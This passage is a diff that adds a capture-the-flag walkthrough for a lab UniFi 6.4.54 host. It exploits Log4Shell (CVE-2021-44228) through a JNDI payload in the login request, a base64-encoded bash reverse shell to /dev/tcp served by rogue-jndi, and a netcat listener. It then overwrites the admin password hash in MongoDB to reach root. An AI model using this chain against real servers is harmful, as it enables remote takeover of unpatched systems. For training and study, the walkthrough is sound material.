@@ -147,3 +147,105 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 183.30 seconds
            Raw packets sent: 1191 (52.380KB) | Rcvd: 1124 (44.964KB)
 ```
+
+Proxy port 8080 redirects to 8443, opening https://10.129.124.108:8443 on browser we can see is UniFi Netowrk version 6.4.54
+
+A quick Google search using the keywords UniFy 6.4.54 exploit reveals an [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) that talks in-depth explotation of the [CVE-2021-44228](]://nvd.nist.gov/vuln/detail/CVE-2021-44228) vulnerability within this application. It's recomended search for some burpsuite howto.
+
+This Log4J vulnerability can be exploited by injecting operating system commands (OS Command Injection), which is a web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server that is running the application and typically fully compromise the application and all its data. To determine if this is the case, we can use FoxyProxy after making a POST request to the /api/login endpoint, to pass on the request to BurpSuite, which will intercept it as a middle-man. The request can then be edited to inject commands. We provide a great module based around intercepting web requests.
+
+# Explotation
+
+Open burpsuite and from proxy browser with intercept on, login with test:test, then forward steps until following POST and change remember string as follow:
+```html
+POST /api/login HTTP/1.1
+
+Host: 10.129.124.108:8443
+
+Content-Length: 68
+
+Sec-Ch-Ua: " Not A;Brand";v="99", "Chromium";v="104"
+
+Sec-Ch-Ua-Mobile: ?0
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
+
+Sec-Ch-Ua-Platform: "Linux"
+
+Content-Type: application/json; charset=utf-8
+
+Accept: */*
+
+Origin: https://10.129.124.108:8443
+
+Sec-Fetch-Site: same-origin
+
+Sec-Fetch-Mode: cors
+
+Sec-Fetch-Dest: empty
+
+Referer: https://10.129.124.108:8443/manage/account/login?redirect=%2Fmanage
+
+Accept-Encoding: gzip, deflate
+
+Accept-Language: en-US,en;q=0.9
+
+Connection: close
+
+{"username":"temp","password":"temp","remember":"${jndi:ldap://10.10.14.203/whatever}","strict":true}
+```
+
+Then right click and select send to repeater, go to repeater tab and we are ready to send every times we need this post to server.
+
+Install maven and clone rogue-jndi tool, lets create jar file with the follow command:
+First get base64 string command needed to create jar file:
+```shell
+echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' | base64
+```
+
+Take note from BASE64 string and create file jar:
+```shell
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}| {base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
+```
+
+Example:
+```shell
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,- d}|{bash,-i}" --hostname "10.10.14.33
+```
+
+
+Open netcat listener to capture reverse shell:
+```shell
+nc -lvp 4444
+```
+
+Go to burpsuite and send againt on repeater the jndi string, on Netcat console type the following command to get an interactive shell:
+```
+script /dev/null -c bash
+```
+
+# Privilege Escalation
+
+Find mongodb port:
+```shell
+ps aux|grep mongo
+```
+
+Searching on google we find that the default mongodb name used by Unify is ace, lets check passwords information:
+```shell
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+```
+
+Passwords are on SHA-512 Algorighm, let's generate a new password:
+```shell
+mkpasswd -m sha-512 Password1234
+$6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1
+```
+
+Update admin password:
+```shell
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$NCavlUJoPQR4Np7P$rb9bQDPyEfZg0WJ6f0Rt0duLSvsnnY5EVwQiQpFk.y49ra/cUD2b/B3D06gMJ6HTF5VudOTs3PM2Ynk9SR6hd0"}})'
+```
+
+Let's now visit website with administrator and Paswrod1234 and go to settings -> site, go to ssh section and unmask root ssh password. Ready to get root/user flags.
+
